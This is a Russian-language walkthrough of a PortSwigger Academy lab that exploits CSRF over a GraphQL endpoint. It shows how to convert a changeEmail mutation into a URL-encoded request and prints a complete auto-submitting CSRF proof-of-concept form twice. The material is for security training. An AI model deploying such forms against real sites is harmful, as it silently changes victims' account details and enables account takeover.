Зайдем на уязвимый ресурс и залогинимся под `wiener:peter`

и даже сменим ему почту на `change@me.com`

Далее перейдем в `Proxy` -> `HTTP history` и найдем данный запрос и отправим его в `Repeater`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/5.%20Performing%20CSRF%20exploits%20over%20GraphQL/pics%20for%20walkthrough/1.png)

Далее, по заданию известно, что приложение поддерживает запросы `application/x-www-form-urlencoded`

изменим `Content-Type` на  `application/x-www-form-urlencoded` и отправим запрос, и получим 400 статус код
Да, логично, потому что в прошлом запросе мы передавали `json`, а тут надо в `url` кодирове
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/5.%20Performing%20CSRF%20exploits%20over%20GraphQL/pics%20for%20walkthrough/2.png)

Соответсвенно изменим 
```
{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"change2@me.com"}}}
```
в URL кодировку, и получим

все `"` меняем на пустой символ (ничего)
`\n` тоже меняем на пустой символ (ничего)
Лишние `пробелы` удаляем, а один отправляем на `%20`
`,` меняем на` &`

В итоге получаем запрос 
```
query=mutation%20changeEmail($input:ChangeEmailInput!){changeEmail(input:$input){email}}&operationName=changeEmail&variables={"input":{"email":"change2@me.com"}}
```
отправляем его и получаем `200` респонс статус код

и даже если обновим страницу в браузере, увидим, что почтовый ящик сменился на `change2@me.com`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/5.%20Performing%20CSRF%20exploits%20over%20GraphQL/pics%20for%20walkthrough/3.png)

Отлично, теперь попробуем сгенерировать CSRF PoC


нажмем `ПКМ` -> `Engagement tools` -> `Generate CSRF PoC` и изменим почту на `change3@me.com`
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4100bc034a91a28190a75f005900a0.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation&#32;changeEmail&#40;&#36;input&#58;ChangeEmailInput&#33;&#41;&#123;changeEmail&#40;input&#58;&#36;input&#41;&#123;email&#125;&#125;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;change3&#64;me&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Протестим в браузере, и получим 200 респонс статус код, и то, что почта сменилась на `change3@me.com`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/5.%20Performing%20CSRF%20exploits%20over%20GraphQL/pics%20for%20walkthrough/4.png)

Все работает, а значит меняем `change3` на `change4` и идем в `Exploit server` вставлять

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4100bc034a91a28190a75f005900a0.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation&#32;changeEmail&#40;&#36;input&#58;ChangeEmailInput&#33;&#41;&#123;changeEmail&#40;input&#58;&#36;input&#41;&#123;email&#125;&#125;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;change4&#64;me&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/5.%20Performing%20CSRF%20exploits%20over%20GraphQL/pics%20for%20walkthrough/5.png)

Нажмем `Store` -> `Deliver exploit to victim` и получим сообщение об успешно выполненной лабораторной работе
